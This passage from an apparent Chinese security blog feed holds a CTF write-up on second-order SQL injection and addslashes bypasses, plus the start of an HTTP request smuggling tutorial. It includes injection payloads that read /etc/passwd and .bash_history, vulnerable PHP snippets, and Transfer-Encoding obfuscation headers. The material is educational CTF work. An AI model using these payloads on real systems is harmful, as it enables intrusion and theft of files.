3.x with symfony SSTI  <a href="https://xz.aliyun.com/t/7507">https://xz.aliyun.com/t/7507</a></p><p>TWIG 全版本通用 SSTI payloads <a href="https://xz.aliyun.com/t/7518">https://xz.aliyun.com/t/7518</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2018-commit题解&amp;二次注入&amp;addslashes安全问题&amp;insert注入</title>
      <link href="2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/"/>
      <url>2021/02/02/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DComment/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这道题目本身虽然只是考察二次注入,但是寻找问题解决方法的过程中遇到了一些不相关知识点,也来记录下</p><h2 id="0x01题解"><a href="#0x01题解" class="headerlink" title="0x01题解"></a>0x01题解</h2><p> 发现提交评论需要登录,然后login.php 爆破得到zhangwei/zhangwei666 </p><h3 id="GitTools"><a href="#GitTools" class="headerlink" title="GitTools"></a>GitTools</h3><p>在P牛小密圈发现了一个比较好用的工具,可以提取每次commit的信息,这样比赛的时候也不必担心会在Git上面做文章了. 项目地址  <a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a> </p><p>中间还找到了一篇相关文章 <a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html">https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html</a> </p><p>具体使用:</p><p>先用Dumper下载git文件</p><p><img src="1612261070642.png" alt="1612261070642"></p><p>然后用Extractor提取commit记录和文件</p><p><img src="1612261129353.png" alt="1612261129353"></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>得到的代码(省略了一些不相关的代码)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p> 可以看到addslashes()函数把传入的参数过滤了.尝试宽字节注入,未果. 在尝试<code>%df</code>吸收<code>\</code>的时候,发现只是没有<code>%df</code>回显而已,并不代表可以宽字节注入 .当然,这道题如果设置set character_set_client = gbk是可以利用宽字节进行注入的. </p><p>实际本题考察的点为二次注入,引用了p牛小密圈的一张图,来说明Mysql对<code>\&#39;</code>的处理</p><p> <img src="FpRCBXp7giiPnJXsDB3NoTBZVmxe" alt="image"> </p><p> 引号<code> &#39;</code> 在addslashes()作用下,变成<code> \&#39;</code> , 但是在插入数据库的时候又会变成 <code>&#39;</code>   , 在下面的代码中,没有对从数据库中读出来的<code>$category</code>进行过滤就将它插入到了新的SQL语句中,从而造成二次注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">发帖:</span><br><span class="line">category<span class="operator">=</span><span class="string">&#x27;,content=user(),/*</span></span><br><span class="line"><span class="string">留言:</span></span><br><span class="line"><span class="string">content=*/#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在二次注入的sql语句中,利用多行注释来注入</span></span><br><span class="line"><span class="string">$sql = &quot;insert into comment</span></span><br><span class="line"><span class="string">set category = &#x27;&#x27;,content=user(),/*&#x27;</span>,</span><br><span class="line">content <span class="operator">=</span> <span class="string">&#x27;*/#&#x27;</span>,</span><br><span class="line">bo_id <span class="operator">=</span> <span class="string">&#x27;$bo_id&#x27;</span>&quot;;</span><br></pre></td></tr></table></figure><p>最后的一些效果 </p><p><img src="image.png" alt="image.png"> </p><p>然后构造读取文件的payload,本题利用sql读取文件又是另一个点, 这个直接参考peri0d师傅的wp <a href="https://www.cnblogs.com/peri0d/p/14077324.html">https://www.cnblogs.com/peri0d/p/14077324.html</a>. (这个读取文件,又要在别的师傅博客找找思路,以前并没有见过这种思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39;,content&#x3D;(select load_file(&quot;&#x2F;etc&#x2F;passwd&quot;)),&#x2F;*</span><br><span class="line">&#39;,content&#x3D;(select load_file(&quot;&#x2F;home&#x2F;www&#x2F;.bash_history&quot;)),&#x2F;*</span><br><span class="line"># cd &#x2F;tmp&#x2F; unzip html.zip rm -f html.zip cp -r html &#x2F;var&#x2F;www&#x2F; cd &#x2F;var&#x2F;www&#x2F;html&#x2F; rm -f .DS_Store service apache2 start</span><br><span class="line">&#39;,content&#x3D;(select hex(load_file(&quot;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&quot;))),&#x2F;*</span><br><span class="line">&#39;,content&#x3D;(select hex(load_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&quot;))),&#x2F;*</span><br></pre></td></tr></table></figure><blockquote><p>也没有尝试直接执行命令,题目应该是禁止的.</p></blockquote><h2 id="0x02-二次注入"><a href="#0x02-二次注入" class="headerlink" title="0x02 二次注入"></a>0x02 二次注入</h2><p>做了这么多sql注入,看了这么多文章.遇到这个还是没想到. 这次来总结一些特征. </p><p>借用了Spoock师傅博客一张图: <a href="https://blog.spoock.com/2017/03/27/sql-mutil-injecton-and-block/">https://blog.spoock.com/2017/03/27/sql-mutil-injecton-and-block/</a></p><p> <img src="4.png" alt="img"> </p><p>最主要的是Mysql对<code>\&#39;</code>的处理,Mysql把<code>\&#39;</code>当作一个字符,而不是两个.直接截取P牛小密圈的一段话</p><p><img src="1612261796989.png" alt="1612261796989"></p><p>重点是应该警惕addslashes(),并不是使用了addslashes()就是安全的.二次注入就暴露了一些addslashes()的安全问题,只不过这点不存在于它本身,而是开发者对addslashes()的信任和不了解</p><h2 id="0x03-addslashes"><a href="#0x03-addslashes" class="headerlink" title="0x03 addslashes"></a>0x03 addslashes</h2><p>此题之后我对addslashes的看法完全改变了,它并没有我想象的这么安全, 来看一看addslashes会有那些安全问题</p><h3 id="bypass-addslashes"><a href="#bypass-addslashes" class="headerlink" title="bypass addslashes"></a>bypass addslashes</h3><p>做题的时候找到了这篇文章 <a href="https://bbs.ichunqiu.com/thread-10899-1-1.html">代码审计之绕过addslashes总结</a>, </p><p>总结下其中的bypass方法:</p><ol><li><p>宽字节注入 </p><p>一个是熟知的``%df%5c<code> =&gt;</code> 運  `utf-8 =&gt; gbk</p><p>一个是逆向的gbk=&gt;utf-8<code>錦(0xe55c)\&#39;</code>=&gt;<code>%e5%5c%5c%27</code>=&gt; <code>%5e\\&#39;</code></p><p>关键代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$username</span>=iconv(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$username</span>=iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>,<span class="variable">$username</span>);</span><br></pre></td></tr></table></figure></li><li><p>编码绕过</p><p>下面这些比较明显</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># urldecode</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span>=addslashes(<span class="variable">$username</span>);[/size][/color]</span><br><span class="line"><span class="variable">$username</span>=urldecode(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64_decode</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span>=addslashes(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$username</span>=base64_decode(<span class="variable">$username</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>json编码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;admin\&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=addslashes(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment"># admin\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$username</span>=addslashes(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$username</span>=json_encode(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span>=md5(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select count(*) as num from admin where name=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and pass=&#x27;&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>stripslashes</code>  删除反斜杠：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> stripslashes(<span class="string">&quot;Who\&#x27;s Bill Gates?&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">#   &quot;Who&#x27;s Bill Gates?</span></span><br></pre></td></tr></table></figure></li><li><p>字符替换导致的绕过addslashes </p><p>文中给的示例, 这个还比较直接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>=addslashes(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$username</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot; &quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span>=md5(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select count(*) as num from admin where name=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and pass=&#x27;&quot;</span>.<span class="variable">$password</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>还有 CISCN2019 总决赛 Day2 Web1 的Easyweb</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br></pre></td></tr></table></figure><p> 传入<code>?id=\0&amp;path=or id=1%23</code> =&gt; 最后的sql语句<code>select * from images where id=&#39;\&#39; or path=&#39;or id=1#&#39;</code> </p></li><li><p>还有<code>sprintf</code></p><p>第五届上海市大学生网络安全大赛TryLogin <a href="https://blog.csdn.net/weixin_45551083/article/details/109822811">https://blog.csdn.net/weixin_45551083/article/details/109822811</a></p><p>构造<code>password=%1$&#39;xxxx</code>来逃逸引号 </p><p> <img src="a76dca5f4446c1c5701e2e89a36896eb.png" alt="img"> </p><p> <img src="2e049f48ec86091b5977842d727591d4.png" alt="img"> </p><p>原理在 <a href="https://blog.csdn.net/weixin_41185953/article/details/80485075.%E5%85%B6%E5%AE%9E%E8%BF%98%E6%98%AF%E6%B2%A1%E6%90%9E%E5%A4%AA%E6%B8%85%E6%A5%9A">https://blog.csdn.net/weixin_41185953/article/details/80485075.其实还是没搞太清楚</a>.</p></li><li><p>二次注入</p></li></ol><h2 id="0x04-insert注入"><a href="#0x04-insert注入" class="headerlink" title="0x04 insert注入"></a>0x04 insert注入</h2><p>这道题的insert注入似乎和以前遇到的都不太一样.来理一下思路</p><ul><li>bool类型的注入点 可以盲注</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">user</span>(sex, name) <span class="keyword">VALUES</span> (<span class="number">0</span>, <span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">user</span>(sex, name) <span class="keyword">VALUES</span> (<span class="number">0</span> <span class="keyword">or</span> <span class="number">-1</span> <span class="keyword">or</span> <span class="number">0</span>, <span class="string">&#x27;abc&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>数字型: 把结果转化为10进制数字</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO user(name, num) VALUES (<span class="string">&#x27;abc&#x27;</span>, <span class="number">123</span>);</span><br><span class="line">=&gt;</span><br><span class="line">INSERT INTO user(name, num) VALUES (<span class="string">&#x27;abc&#x27;</span>, <span class="number">0</span>+conv(hex(user()),<span class="number">16</span>,<span class="number">10</span>));</span><br><span class="line">或者 INSERT INTO user(name, num) VALUES (<span class="string">&#x27;abc&#x27;</span>, <span class="number">0</span>+conv(user(),<span class="number">36</span>,<span class="number">10</span>));</span><br></pre></td></tr></table></figure><ul><li>字符类型,插入多条值</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span> (name,pwd) <span class="keyword">values</span> (<span class="string">&#x27;xxxx&#x27;</span>,<span class="string">&#x27;xxxx&#x27;</span>),((<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">1</span>)# <span class="string">&#x27;,&#x27;</span>a<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure><p>  而本道题是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> comment</span><br><span class="line"><span class="keyword">set</span> category <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">content <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">bo_id <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>;</span><br></pre></td></tr></table></figure><p>可以利用本道题的trick</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> comment</span><br><span class="line"><span class="keyword">set</span> category <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>,content<span class="operator">=</span><span class="keyword">user</span>(),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">content = &#x27;*/</span>#<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">bo_id = &#x27;</span>$bo_id<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><h2 id="0x05-最后"><a href="#0x05-最后" class="headerlink" title="0x05 最后"></a>0x05 最后</h2><p>中途还看到了这篇文章  <a href="https://blog.spoock.com/2017/03/27/sql-mutil-injecton-and-block/">sql二次注入和截断联合使用</a> ,在  sql-mode 为非严格模式的时候,可以产生一种截断注入,就以后再研究了</p><p>紧接着又做到了一个二次注入的题目: <a href="https://blog.csdn.net/weixin_45551083/article/details/113576689">[CISCN2019 华北赛区 Day1 Web5]CyberPunk题解</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈HTTP请求走私</title>
      <link href="2021/01/31/HTTP%20request%20smuggling/"/>
      <url>2021/01/31/HTTP%20request%20smuggling/</url>
      
        <content type="html"><![CDATA[<h2 id="0x-01-知识背景"><a href="#0x-01-知识背景" class="headerlink" title="0x 01 知识背景"></a>0x 01 知识背景</h2><p>HTTP中存在一个重要概念是 Persistent Connection (持久连接)</p><p> HTTP/1.0 的持久连接通过<code>Connection: keep-alive</code>实现    </p><p> HTTP/1.1 则规定所有连接都必须是持久的，除非显式地在头部加上 <code>Connection: close</code> </p><p>在 <a href="https://blog.csdn.net/u014569188/article/details/78912469">这篇文章里面可以了解到</a>:对于持久连接,一个传输实体必须有一个结束标志.并且存在两种HTTP请求结束的标志: <code>Content-Length </code>和<code>Transfer-Encoding</code></p><p><code>Content-Length</code>:直接给出了实体长度</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>12\r\n</span><br><span class="line">\r\n</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure><p><code>Transfer-Encoding</code>:实体进行分块编码  </p><p>每个分块包含十六进制的长度值和数据，长度值独占一行(长度不包括 <code>CRLF(\r\n)</code>)</p><blockquote><p>长度都是以字节为单位计算的</p></blockquote><p> 最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">b\r\n</span><br><span class="line">01234567890\r\n</span><br><span class="line">5\r\n</span><br><span class="line">12345\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>这两种方式的区别可参考 <a href="https://blog.csdn.net/u014569188/article/details/78912469">https://blog.csdn.net/u014569188/article/details/78912469</a></p><p>还有一个 <code>Content-Encoding </code>的东西经常和 <code>Transfer-Encoding </code>结合使用,具体可以参考上面那篇文章</p><p>为了缓解源站的压力，一般会在用户和后端服务器（源站）之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，IP 也是相对固定的，所以可以重用 TCP 连接来减少频繁 TCP 握手带来的开销 .</p><p>在用户和资源服务器之间还可能存在专用的防火墙服务器等.</p><h2 id="0x-02-HTTP请求走私"><a href="#0x-02-HTTP请求走私" class="headerlink" title="0x 02 HTTP请求走私"></a>0x 02 HTTP请求走私</h2><p>由于HTTP规范提供了两种不同的方法来指定HTTP消息的长度，因此单个消息可能会同时使用这两种方法,虽然HTTP规范中指出,如果 <code>Content-Length</code>和<code>Transfer-Encoding</code>头同时存在 ,<code>content-length</code>头则会被忽略,但是两个服务器之间可能有一个不支持<code>Transfer-Encoding</code>或者攻击者对TE进行了混淆,导致两个server之间的标准不一样,从而产生请求走私漏洞.</p><p>具体的三种情况:</p><ul><li><p> <code>CL.TE </code>:  前置服务器认为 <code>Content-Length</code> 优先级更高（或者根本就不支持 <code>Transfer-Encoding</code> ） ，后端认为 <code>Transfer-Encoding</code> 优先级更高 </p></li><li><p><code>TE-CL</code>：前置服务器认为 <code>Transfer-Encoding</code> 优先级更高，后端认为 <code>Content-Length</code> 优先级更高（或者不支持 <code>Transfer-Encoding</code> ）</p></li><li><p><code>TE-TE</code>：前置和后端服务器都支持 <code>Transfer-Encoding</code>，但可以通过混淆让它们在处理时产生分歧</p></li></ul><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>发出两次下面的请求,可观察到服务器返回的error信息  <code>&quot;Unrecognized method GPOST&quot;</code></p><p><img src="1612096003402.png" alt="1612096003402"></p><p>前置服务器根据content-length把下面的实体数据全部发送了</p><blockquote><p>这里长度计算不包括第一个<code>\r\n</code>,这是请求头和请求体之间的边界</p></blockquote><p>然后后端服务器根据<code>Transfer-Encoding</code>,将<code>0\r\n\r\n</code>视为一个块结束的标志.G滞留在缓冲区.</p><p>然后再次发起请求的时候滞留的G和新的块拼接在了一起 ,就变成了<code>GPOST\r\nHOST:...</code></p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>连续发送下面的请求</p><p><img src="1612097382479.png" alt="1612097382479"></p><p>前置服务器根据<code>Transfer-Encoding</code>判断请求边界,将整个请求体发送给后端服务器</p><p>然后后端服务器根据<code>Content-Length: 4</code>只对<code>5c\r\n</code>进行了处理,后面的部分滞留在缓冲区</p><p>然后再次发送请求,就会出现<code>&quot;Unrecognized method GPOST&quot;</code>的错误</p><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>对TE进行一些混淆</p><p><img src="1612097986236.png" alt="1612097986236"></p><p>两个服务器对存在两个Transfer-Encoding时的处理存在不一致,一个倾向Transfer-encoding,一个倾向 Transfer-Encoding</p><p>还有别的混淆如:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding[空格]: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[空格]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><h2 id="0x03探测"><a href="#0x03探测" class="headerlink" title="0x03探测"></a>0x03探测</h2><h3 